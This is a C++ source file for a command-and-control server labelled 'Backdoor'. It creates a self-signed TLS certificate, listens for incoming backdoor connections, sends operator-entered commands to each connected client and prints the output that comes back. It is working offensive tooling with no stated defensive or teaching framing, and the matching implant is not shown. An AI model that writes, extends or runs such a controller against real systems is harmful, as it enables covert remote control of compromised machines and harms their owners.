//g++ -o Backdoor-C2.o Backdoor-C2.cpp -lssl -lcrypto

#include <iostream>
#include <string>
#include <cstring>
#include <fstream>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <sys/stat.h>

// Function to check if a file exists
bool fileExists(const std::string& filename) {
    struct stat buffer;
    return (stat(filename.c_str(), &buffer) == 0);
}

// Function to generate a self-signed certificate and key using OpenSSL
void generateSelfSignedCert(const std::string& certFile, const std::string& keyFile) {
    std::string certCmd = "openssl req -newkey rsa:2048 -nodes -keyout " + keyFile +
                          " -x509 -days 365 -out " + certFile + 
                          " -subj \"/C=US/ST=State/L=City/O=Organization/OU=OrgUnit/CN=localhost\"";
    std::system(certCmd.c_str());
    std::cout << "[+] Generated self-signed certificate: " << certFile 
              << " and key: " << keyFile << std::endl;
}

// Function to initialize the OpenSSL library
void initializeSSL() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

// Function to clean up OpenSSL
void cleanupSSL() {
    EVP_cleanup();
}

// Function to create an SSL context
SSL_CTX* createSSLContext() {
    const SSL_METHOD* method = TLS_server_method();
    SSL_CTX* ctx = SSL_CTX_new(method);
    if (!ctx) {
        std::cerr << "Unable to create SSL context" << std::endl;
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    return ctx;
}

// Function to configure SSL context with certificate and key
void configureSSLContext(SSL_CTX* ctx, const std::string& certFile, const std::string& keyFile) {
    if (SSL_CTX_use_certificate_file(ctx, certFile.c_str(), SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    if (SSL_CTX_use_PrivateKey_file(ctx, keyFile.c_str(), SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
}

// Function to handle the C2 server
void startC2Server(const std::string& certFile, const std::string& keyFile) {
    std::cout << R"(
  ____             _       _                  
 |  _ \           | |     | |                 
 | |_) | __ _  ___| | ____| | ___   ___  _ __ 
 |  _ < / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
 | |_) | (_| | (__|   < (_| | (_) | (_) | |   
 |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                              
)" << std::endl;

    // Initialize OpenSSL
    initializeSSL();
    SSL_CTX* ctx = createSSLContext();
    configureSSLContext(ctx, certFile, keyFile);

    // Get host and port information
    std::string host;
    int port;
    std::cout << "Enter the IP address to listen on: ";
    std::cin >> host;
    std::cout << "Enter the port to listen on: ";
    std::cin >> port;

    // Create socket
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        std::cerr << "Failed to create socket" << std::endl;
        return;
    }

    // Bind to IP and port
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(host.c_str());

    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        std::cerr << "Failed to bind to address" << std::endl;
        return;
    }

    // Listen for incoming connections
    if (listen(server_fd, 5) < 0) {
        std::cerr << "Failed to listen on socket" << std::endl;
        return;
    }

    std::cout << "[+] Listening for connections..." << std::endl;

    // Accept incoming connections
    while (true) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
        if (client_fd < 0) {
            std::cerr << "Failed to accept connection" << std::endl;
            return;
        }

        // Wrap the client socket with SSL
        SSL* ssl = SSL_new(ctx);
        SSL_set_fd(ssl, client_fd);

        if (SSL_accept(ssl) <= 0) {
            ERR_print_errors_fp(stderr);
        } else {
            std::cout << "[+] Secure connection from " << inet_ntoa(client_addr.sin_addr) 
                      << ":" << ntohs(client_addr.sin_port) << std::endl;

            // Send command to client
            std::string command;
            std::cout << "Enter command to send: ";
            std::cin.ignore();
            std::getline(std::cin, command);

            SSL_write(ssl, command.c_str(), command.length());

            // Receive output from client
            char buffer[4096];
            int bytes;
            std::string output;
            while ((bytes = SSL_read(ssl, buffer, sizeof(buffer))) > 0) {
                output.append(buffer, bytes);
            }

            std::cout << "[+] Binary output from backdoor:\n" << output << std::endl;
        }

        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(client_fd);
    }

    close(server_fd);
    SSL_CTX_free(ctx);
    cleanupSSL();
}

int main() {
    const std::string CERT_FILE = "server.crt";
    const std::string KEY_FILE = "server.key";

    // Generate self-signed certificate if it does not exist
    if (!fileExists(CERT_FILE) || !fileExists(KEY_FILE)) {
        generateSelfSignedCert(CERT_FILE, KEY_FILE);
    }

    startC2Server(CERT_FILE, KEY_FILE);

    return 0;
}

